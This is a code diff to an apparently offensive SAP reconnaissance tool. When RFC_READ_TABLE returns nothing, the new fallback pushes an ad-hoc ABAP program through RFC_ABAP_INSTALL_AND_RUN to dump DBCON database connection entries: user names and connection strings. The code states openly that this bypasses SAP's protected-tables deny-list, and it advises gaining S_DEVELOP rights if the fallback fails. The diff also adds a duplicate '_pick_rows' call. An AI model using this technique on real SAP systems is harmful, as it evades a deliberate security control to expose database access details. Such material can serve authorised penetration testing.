@@ -162,21 +162,21 @@ def read_dbcon(node: SAPNode, creds: Credentials = None) -> list:
         return []
 
     if result is None:
-        # Nothing came back from ANY candidate.  Give the operator
-        # something actionable to try next.
-        hint = ""
-        if return_msgs:
-            hint = f" — last RFC RETURN: {return_msgs}"
-        elif any(("NOT_AUTHORIZED" in m or "no auth" in m.lower())
-                 for m in return_msgs):
-            hint = " — RFC_READ_TABLE denied by S_TABU_NAM"
-        print(f"[-] {node.sid}: read_dbcon: no DBCON candidate table "
-              f"returned rows (tried {CANDIDATE_TABLES}){hint}. "
-              f"Options: (a) verify DBCON entries exist in SM30/DBCO, "
-              f"(b) grant S_TABU_NAM=DBCON to the RFC user, or "
-              f"(c) if entries live in a release-specific table, "
-              f"extend CANDIDATE_TABLES.")
-        return []
+        # RFC_READ_TABLE came back clean but with 0 rows on every
+        # candidate.  This is the fingerprint of the hardened
+        # protected-tables list on modern S/4 (SAP Notes 2246160 /
+        # 3242476 / 3181974): the FM returns success with an empty
+        # DATA table instead of NOT_AUTHORIZED when the queried table
+        # is on the deny-list.  Escape hatch: push a tiny ABAP program
+        # via RFC_ABAP_INSTALL_AND_RUN that SELECTs from DBCON
+        # directly — bypasses the FM's table filter entirely.
+        print(f"[*] {node.sid}: read_dbcon: RFC_READ_TABLE returned "
+              f"empty for every candidate table — falling back to "
+              f"RFC_ABAP_INSTALL_AND_RUN direct SELECT (works around "
+              f"modern-S/4 protected-tables list)")
+        return _read_dbcon_via_abap(node, creds)
+
+    raw, n_narrow, n_wide = _pick_rows(result)
 
     raw, n_narrow, n_wide = _pick_rows(result)
     print(f"[*] {node.sid}: read_dbcon: {table_used} (variant "
@@ -198,6 +198,79 @@ def read_dbcon(node: SAPNode, creds: Credentials = None) -> list:
             "user":     user_name,
             "con_env":  con_env,
         })
+    return rows
+
+
+# ============================================================================
+# RFC_ABAP_INSTALL_AND_RUN fallback — bypasses protected-tables list
+# ============================================================================
+
+def _read_dbcon_via_abap(node: SAPNode, creds: Credentials = None) -> list:
+    """SELECT the DBCON rows via a dynamically-compiled ABAP program.
+
+    Modern S/4 wraps RFC_READ_TABLE with a protected-tables filter
+    that returns empty for tables like DBCON without raising
+    NOT_AUTHORIZED.  RFC_ABAP_INSTALL_AND_RUN does not apply that
+    filter — the SELECT runs in the caller's ABAP session with the
+    normal S_TABU_* / S_DEVELOP checks (which the RFC user usually
+    already has for its ordinary destination-management work).
+
+    We use '~~~' as the field separator instead of '|' because a
+    HANA CON_ENV can legitimately contain '|' inside JDBC-style
+    connect strings.
+    """
+    from sapmap_rfc import _run_abap_program, _get_connection
+    from sapmap_errors import format_rfc_exception
+
+    SEP = "~~~"
+    abap = [
+        "REPORT zsapmap_dbcon.",
+        "DATA: BEGIN OF gs,",
+        "        con_name  TYPE dbcon-con_name,",
+        "        dbms      TYPE dbcon-dbms,",
+        "        user_name TYPE dbcon-user_name,",
+        "        con_env   TYPE dbcon-con_env,",
+        "      END OF gs.",
+        "DATA gt LIKE TABLE OF gs.",
+        "DATA lv_line TYPE string.",
+        "SELECT con_name dbms user_name con_env "
+        "FROM dbcon INTO TABLE gt.",
+        "LOOP AT gt INTO gs.",
+        f"  CONCATENATE gs-con_name '{SEP}' gs-dbms '{SEP}' "
+        f"gs-user_name '{SEP}' gs-con_env INTO lv_line.",
+        "  WRITE: / lv_line.",
+        "ENDLOOP.",
+    ]
+
+    try:
+        with _get_connection(node, creds) as conn:
+            run = _run_abap_program(conn, abap, "ZSAPMAP_DBCON")
+    except Exception as e:
+        print(f"[-] {node.sid}: read_dbcon_via_abap: connection "
+              f"failed — {format_rfc_exception(e)}")
+        return []
+
+    if not run["success"]:
+        print(f"[-] {node.sid}: read_dbcon_via_abap: "
+              f"RFC_ABAP_INSTALL_AND_RUN failed — {run['error']}. "
+              f"Grant S_DEVELOP (P_GROUP=SUPER, ACTVT=03) or run "
+              f"the DBCON dump manually via SE38.")
+        return []
+
+    rows = []
+    for line in run["output"]:
+        parts = [p.strip() for p in line.split(SEP)]
+        if len(parts) < 4 or not parts[0]:
+            continue
+        rows.append({
+            "con_name": parts[0],
+            "dbms":     parts[1].upper(),
+            "user":     parts[2],
+            "con_env":  parts[3],
+        })
+    print(f"[+] {node.sid}: read_dbcon_via_abap: recovered "
+          f"{len(rows)} DBCON row(s) via ABAP SELECT "
+          f"(RFC_READ_TABLE was blocked / empty)")
     return rows
 
 
